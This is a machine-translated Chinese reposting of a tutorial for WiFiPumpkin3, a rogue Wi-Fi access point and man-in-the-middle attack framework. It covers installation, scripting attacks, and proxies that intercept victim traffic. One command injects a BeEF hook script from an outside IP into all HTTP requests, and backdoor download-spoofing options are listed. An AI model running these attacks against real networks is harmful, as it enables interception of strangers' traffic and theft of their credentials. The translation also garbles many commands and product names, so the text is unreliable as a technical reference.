# WiFiPumpkin3:针对流氓接入点攻击的强大框架

> 原文：<https://kalilinuxtutorials.com/wifipumpkin3/>

[![WiFiPumpkin3 : Powerful Framework For Rogue Access Point Attack](img/5432efbbc042315274e28ef9d8c0acab.png "WiFiPumpkin3 : Powerful Framework For Rogue Access Point Attack")](https://1.bp.blogspot.com/-acDt4eBqF_g/XrqOyTmgo7I/AAAAAAAAGSo/kg1SgKfTYUc3VMLrwK8jGfnYXnB1HBdfACLcBGAsYHQ/s1600/wifipumpkin3.png)

wifi mpkin 3 是针对流氓接入点攻击的强大框架，用 Python 编写，允许并向安全研究人员、red teamers 和逆向工程师提供安装无线网络以进行中间人攻击的机会。

**主要特点**

*   流氓接入点攻击
*   中间人攻击
*   流氓 **Dns 服务器**
*   强制网络门户攻击(captiveflask)
*   **拦截**，检查、修改和重放**网页流量**
*   **WiFi** 网络扫描
*   **DNS** 监控服务
*   凭据收集
*   透明代理
*   LLMNR，NBT-NS 和 MDNS 投毒者([响应者 3](https://github.com/skelsec/Responder3) )
*   还有**更**！

**支持的平台**

*   Python:运行 Wp3 需要 Python 3.7 或更高版本。

**注意:**Wp3 默认需要安装 hostapd

*   操作系统:
    *   Linux 的最新版本(我们在 Ubuntu 18.04 LTS 上测试)；
    *   请注意:不支持 Windows。

**安装**

在`Python 3`中写的**wifi mpkin 3**，你需要在你的机器上有一个工作的 Python ( **版本 3.7 或更高版本**)。

注意到

*   不支持**窗口**。
*   不支持 Mac OS X 。只有 **docker** 版本，但是还没有测试过。

**也可以理解为-[PowerSploit:一个 PowerShell 后开发框架](https://kalilinuxtutorials.com/powersploit-a-powershell-post-exploitation-framework/)**

**要求**

你需要一个支持**接入点(AP)模式**的 Wi-Fi 适配器。下面的操作系统列表代表了运行`wifipumpkin3` (wp3)的推荐环境，因为大多数必需的依赖项都是预安装的。也建议使用虚拟机或 docker。

##### 工具(预装)

*   iptables(当前版本:iptables v1.6.1)
*   iw(当前版本:iw 版本 4.14)
*   网络工具(当前版本:1.60 以上)
*   无线工具(当前版本:30~pre9-12)
*   hostapd(当前版本:hostapd v2.6)

##### 操作系统(推荐)

| 操作系统（Operating System） | 版本 |
| --- | --- |
| 人的本质 | 18.04 LTS 仿生 |
| 码头工人 | LTS 仿生 |

**基于 Debian 程序**

wifipumpkin3 使用端口 53 来安装 python dns 服务器，当我试图在 Ubuntu 18.04 上安装时，我得到了一些错误，因为这个“端口 53 被另一个进程使用”。这个问题是由 systemd 引起的-只需按照以下步骤解决。

*   stop systemd-resolved " sudo system CTL stop systemd-resolved "
*   用这些文件编辑/etc/systemd/resolved.conf

*   并执行这个链接文件

**sudo ln-SF/run/systemd/resolve/resolv . conf/etc/resolv . conf**

**安装程序**

如果你已经在你的机器上安装了 **python 3.7 或更高版本**，安装 **Wp3** 非常简单。遵循以下步骤:

**Debian/Ubuntu**

强烈建议安装 somes 系统包、操作系统级依赖项。

**sudo apt 安装 python 3.7-dev libssl-dev libffi-dev build-essential python 3.7**

**$ git 克隆 https://github.com/P0cL4bs/wifipumpkin3.git
$ CD wifi mpkin 3
$ sudo make 安装**

或者从 GitHub [Releases](https://github.com/P0cL4bs/wifipumpkin3/releases) 获得一个 Debian `*.deb`包

**$ sudo dpkg-I wifi mpkin 3-1 . 0 . 0-all . deb**

**在 Kali Linux 上安装**

Kali Linux 默认安装了 **python3.8** 与`wp3`不相上下，我推荐安装一些系统包，os 级依赖。

**$ sudo 安装 libssl-dev libffi-dev build-essential
$ git 克隆 https://github.com/P0cL4bs/wifipumpkin3.git
$ CD wifi mpkin 3**

现在，我们需要安装`PyQt5`，这非常容易:

**sudo apt 安装 python3-pyqt5**

或者检查 pyqt5 是否安装成功:

【PyQt5 的 python3 -c”。QtCore 导入 QSettings 打印('完成')"

现在，如果你收到消息`done`，很好。下一步是安装`wp3`:

**$ sudo python 3 setup . py install**

如果你看到下面这条消息，一切正常！

已完成处理 wifi mpkin 3 = = 1 . 0 . 0 的依赖关系

现在，让我们执行应用程序:

**$ sudo wifi mpkin 3**

全部完成后，将会看到`wp3`的 CLI。

**安装 python virtualenv**

Virtualenv 是一个用于创建隔离 Python 环境的工具。Virtualenv 是配置定制 Python 环境的最简单和推荐的方法。

> **版本的 PyQt5**
> 用于安装文件要求的变更. txt 版本的 Qt5，` PyQt5==5.14.0 `到` PyQt5==5.14.2`。这个版本 5.14.2 在 virtualenv 上运行良好，没有 python-sip 依赖性错误。

**$ sudo python3.7 -m pip 安装–升级 pip
$ git 克隆 https://github.com/P0cL4bs/wifipumpkin3.git
$ CD wifi mpkin 3
$ sudo python 3.7-m pip 安装 virtualenv**

现在，您需要使用超级用户`root`来执行:

**# virtualenv-p python 3.7 venv
# source venv/bin/activate
# make install _ env**

如果你看到下面这条消息，一切正常！

> 已完成处理 wifi mpkin 3 = = 1 . 0 . 0 的依赖关系

现在，让我们执行应用程序:

**# wifi mpkin 3**

完成后，将会看到 virtualenv 上的`wp3`CLI 被激活。

在虚拟环境中完成工作后，您可以通过运行以下命令来停用它:

**#停用**

**在码头集装箱上安装**

Docker 是一个开发、发布和运行应用程序的开放平台。Docker 使您能够将应用程序从基础设施中分离出来，这样您就可以快速交付软件。`wp3`完全兼容在 docker 容器上运行。我们走吧:

> **https://docs.docker.com/get-docker/**

安装了 docker.io 并且运行良好后，我们来看看如何用`wp3`挂载容器。[如何在 ubuntu 上安装](https://docs.docker.com/engine/install/ubuntu/)

**git 克隆 https://github . com/p04bs/wifipumpkin 3 . git
$ CD wifipumpkin 3
$ sudo docker build-t『wifipumpkin 3』**

上面的这个命令将为我们下载并构建一个名为`**wifipumpkin3**`的新容器，你将看到 Docker 一步一步地执行你的 Docker 文件中的每一条指令，在此过程中构建你的映像。如果成功，构建过程应该以一条消息结束:

> 成功标记 wifipumpkin3

现在您需要将您的映像作为一个容器运行，启动一个基于您的新映像的容器:

**$ sudo docker run–privileged-ti–RM–name wifi mpkin 3–net host " wifi mpkin 3 "**

完成后，将会在 docker 上看到`wp3`的 CLI，docker 模式已激活。😉

**关于无线适配器**

您的无线适配器和内核驱动程序必须支持 AP 模式。为了检查这一点，请执行以下 shell 命令:

**信息战列表**

如果“支持的接口模式”列表中有“AP”，则您的卡支持所需的模式。

**另一种方法:**

*   通过发出下面的命令找到您正在使用的内核驱动程序模块:`**lspci -k | grep -A 3 -i network**`(示例模块:ath9k)接下来，使用下面的命令找出您的 wifi 功能(用您的内核驱动程序替换 ath9k):`**modinfo ath9k | grep depend**`如果上面的输出包括“mac80211”，则意味着您的 wifi 卡将支持 AP 模式。

适配器需要 GNU/Linux 的驱动程序。

*   另一个网站列出支持的设备[这里](http://elinux.org/RPi_USB_Wi-Fi_Adapters)
*   检查内核驱动 [wireless.wiki](https://wireless.wiki.kernel.org/en/users/drivers)

**用途**

**互动环节**

一旦用`**sudo wifipumpkin3**`启动该工具，你将看到一个类似于`metasploit framework`的交互式会话，在这里你可以启用或禁用模块、插件、代理配置 ap 等。

界面 CLI 非常简单，您需要使用基本命令来执行操作，例如设置接入点(AP)信息(bssid、通道、接口)等会话，启动/停止接入点，以及监视 AP 上加入的客户端活动。

**纸浆**

`Pulps`指从南瓜中提取的果肉，可用于各种混合物。可以使用纸浆文件编写您的交互式会话脚本。纸浆(扩展名为. pulp 的脚本文件)是一种自动化攻击的强大方法，就像 metasploit 的`**.rc**`文件一样，其中文件的每一行都是一个将被一一执行的命令。

让我们来看一下，如何创建一个脚本来设置接口，启用无代理启动，设置网络的 ssid，设置 dns 的无日志工作和启动接入点。

**#配置接口**
设置接口 wlan1
**#设置将被创建的接入点名称**
设置 ssid 演示
**#设置 noproxy plguin**
设置代理 noproxy
**#忽略来自 pydns_server 的所有日志**
忽略 pydns_server
**#启动接入点**
启动

一旦保存为 demo.pulp 文件，您就可以通过以下方式加载并执行它:

**sudo wifi mpkin 3–pulp/path/to/demo . pulp**

如果你不想用。pulp 文件中，有一个选项可以使用参数–xpulp 或-x，每个命令可以单独执行，也可以通过字符串中的`;`连接起来。例如:

**sudo wifi pumpkin 3–xpulp "设置接口 wlan1 设置 ssid 演示；设置代理 noproxy 开始"**

**参数命令**

基本的命令行参数(wifi mpkin 3-h)是:

**-i 接口**

要绑定到的网络接口，如果为空，默认接口是启动的旧会话。

**-s 会话**

继续攻击的会话，如果您传递旧的会话 id，所有日志将被添加到同一个会话中。

**–纸浆纸浆**

交互式会话可以用脚本编写。纸浆文件，一个强大的自动攻击方式。

**–xpulp xpulp**

每个命令既可以单独执行，也可以由。成串。

**–无线模式 WIRELESS_MODE**

使用这个选项来设置无线模式(static，docker)，默认情况下是 **`static`** 模式，但是如果你想在 docker 容器上运行你可以更改。

**–无色**

禁用终端颜色和效果。

**-v，–版本**

显示程序的版本号并退出。

**核心命令**

*   帮助
    *   将列出所有可用的命令
*   客户
    *   使用高级用户界面显示接入点上连接的所有客户端
*   美国联合通讯社（Associated Press 的缩写）
    *   显示设置 AP 的所有变量和状态。您可以看到(bssid、ssid、通道、安全或状态 ap)
*   设置
    *   设置变量代理、插件和访问点，这个命令集类似于 metasploit set 命令。
*   开始
    *   启动接入点(AP)，如果没有什么问题，将会看到一个新的 AP 与 hostapd 程序。代理，插件也应该初始化。
*   停止
    *   停止正在后台运行的接入点、进程、线程、插件和代理。
*   忽视
    *   消息记录器将被忽略，参数可以是(captiveflask，pumpkinproxy，pydns_server sniffkin3)。如果你输入这个命令，将不会再看到登录控制台 WP。
*   恢复
    *   消息记录器将被恢复，正如你在上面看到的，这个命令是 ignore 的逆命令，使用相同的参数将恢复控制台日志。
*   信息
    *   从代理/插件获取信息，这个命令显示代理/插件的一些信息(日志路径，配置路径，描述)
*   `**jobs**`
    *   在后台显示所有线程/进程。有时候你需要找到 WP 创建的进程的进程 id 或者线程名。
*   `**mode**`
    *   显示所有可用的无线模式。
*   `**plugins**`
    *   显示所有可用的插件及其状态。
*   `**proxys**`
    *   显示所有可用代理及其状态。
*   `**show**`
    *   显示可用模块。
*   `**search**`
    *   通过名称搜索模块，这将在未来百万 OD 模块:太阳镜:可用时实现
*   `**use**`
    *   为模块选择模块，metasploit 模块的全部灵感。

**例题**

**插件**

这些插件被设计来为 WP3 核心添加功能，并与接入点(AP)并行运行，WP3 提供了开发插件的工具。一般来说，为了让一个插件正常工作，你必须做一些事情。

**信息**

最重要的是你可以同时运行多个插件，因为这些插件被设计成只监控和分析连接到接入点的用户产生的流量。

获取插件的基本命令准则是:

如果你想启用或禁用插件，按照下面的命令。

**wp3 >设置插件 plugin_name 真/假**

如果插件有子插件，当键入 **`plugins`** 时，你会看到 set 的一些选项。您可以用命令来启用/禁用子插件，键入 **`tab`** 来自动完成；):

**wp3 >设置 plugin_name.subplugins_name 真/假**

欢迎插件开发者和用户将你的插件加入到这个项目中，看看指南[如何创建插件](https://wifipumpkin3.github.io/docs/getting-started#development)。

**代理**

代理旨在为 WP3 核心添加功能，并与接入点(AP)并行运行，但使用`**iptables**`重定向所有流量。代理的工作方式是拦截请求，必要时修改请求，然后处理请求或将请求转发到目的地。当用户连接到一个 AP 时，透明代理在将请求传递给提供者之前拦截它。

**信息**

最重要的是，你可以每次运行一个代理，因为代理被设计为操纵数据包，将所有数据重定向到特定的端口号

可用的 Porxy:

*   **pumpkin Proxy**–拦截 TCP 协议上网络流量的代理 [doc](https://wifipumpkin3.github.io/docs/getting-started#pumpkinproxy)
*   **captive flask**–允许阻止用户访问互联网，直到他们打开页面登录页面。 [doc](https://wifipumpkin3.github.io/docs/getting-started#captiveflask)
*   **no proxy**–运行时没有代理重定向流量

获取插件的基本命令准则是:

如果你想选择代理，按照下面的命令。

**wp3 >设置代理 proxy_name**

如果代理有插件，当键入`proxys`时，你会看到一些设置选项。您可以启用/禁用插件命令，键入`tab`来自动完成；):

**wp3 >设置 proxy_name.plugin_name 真/假**

上面的例子是为了启用/禁用一个插件，但是你可以使用相同的语法来配置插件参数。您可以看到这个参数键入`**info proxy_name**`或使用类似下面这个例子的类型，使用`**tab**`来自动完成。

wp3 >设置 pumpkinproxy。pumpkin proxy . beef pumpkin proxy . html _ inject pumpkin proxy . beef . URL _ hook pumpkin proxy . html _ inject . content _ path pumpkin proxy . download spoof . backdoor exe path pumpkin proxy . js _ inject . URL pumpkin proxy . download spoof . backdoor pdf path pumpkin proxy . no-cache pumpkin proxy . download spoof . backdoor word path pumpkin proxy . replace images pumpkin proxy . download spoof . backdoor xlspath pumpkin proxy

现在让设置`url_hook`参数的插件 beef 在所有请求 http 中注入 javascript。

**wp3 >设置 pumpkin proxy . beef . URL _ hook http://172 . 16 . 149 . 141:3000/hook . js**

欢迎代理开发者和用户将你的代理加入到这个项目中，看看如何创建代理的指南[。](https://wifipumpkin3.github.io/docs/getting-started#development)

**模块**

一个模块提供了接入点不一定要使用的功能，必备模块是为攻击增加新功能而设计的，如**`devices discovery``services enumeration``perform deauthentication attacks`**等。模块被引入以增加更多的功能来补充攻击。

**信息**

模块的语法基本上遵循“metasploit”的模块结构

基本核心指挥准则:

| 命令 | 描述 |
| --- | --- |
| 设置 | 为模块设置选项 |
| 背部 | 后退一级 |
| 帮助 | 显示可用命令 |
| 选择 | 显示当前模块的选项 |
| 奔跑 | 执行模块 |

欢迎模块开发者和用户将你的模块加入到这个项目中，看看指南[如何创建模块](https://wifipumpkin3.github.io/docs/getting-started#development)。

[**Download**](https://github.com/P0cL4bs/wifipumpkin3)